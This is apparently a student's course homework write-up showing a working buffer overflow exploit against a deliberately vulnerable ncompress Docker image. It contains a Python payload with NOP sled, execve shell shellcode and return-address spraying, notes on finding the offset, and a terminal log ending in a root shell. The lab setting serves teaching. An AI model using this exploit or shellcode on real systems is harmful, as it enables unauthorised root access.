# Homework #0

Topics: Github & Actions, Docker, Python, Bash, Buffer Overflows

# Write up of our first exploit (25 Points)
My exploit is the following:
--------------------------------------------------------------------------------
```import sys
import struct

payload = b""
payload += b"\x90" * 1000
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload += b"\x90" * 16 
payload += struct.pack("<I", 0xffffc9dc+ 1000) *30

sys.stdout.buffer.write(payload)```
--------------------------------------------------------------------------------

I concluded from the source code (the input path is 1024 bytes long) that the buffer is 1024 bytes long. From gdb and testing i concluded that the return address is overwritten after 1068 bytes (buffer plus other stuff). So I added nearly this many bytes as a nop sled, then added the shellcode and some more nop sleds (the code didn't seem to work otherwise). Then I added the address of the return address many times to compensate if the memory addresses "move" a bit. That's the same reason I have added the return address earlier than the 1068 bytes needed offset that I found.
The return address was found using 'sudo dmesg' to inspect where the stack pointer was when the segfault occured. I then found (with trial and error) that 1000 bytes where sufficient to get me to the nop sled, leading to execution of my shellcode. I have tested this and it works in multiple instances.


--------------------------------------------------------------------------------
A successful invocation:
--------------------------------------------------------------------------------
```
~/Documents/hack_intro/erg1/hw0-KStamoulis$ docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/ncompress:vulnerable
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

ubuntu@0d9b8c1aa83d:~$ echo hello | ncompress
��hʰa�Fubuntu@0d9b8c1aa83d:~$ python3 /exploit.py > /tmp/payload
ubuntu@0d9b8c1aa83d:~$ whoami
ubuntu
ubuntu@0d9b8c1aa83d:~$ ncompress `cat /tmp/payload`
����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin����°
                      1�@̀����������������������������������������������������������������������������������������������������������������������������������������: File name too long
# whoami
root
# exit
ubuntu@0d9b8c1aa83d:~$ 
```
--------------------------------------------------------------------------------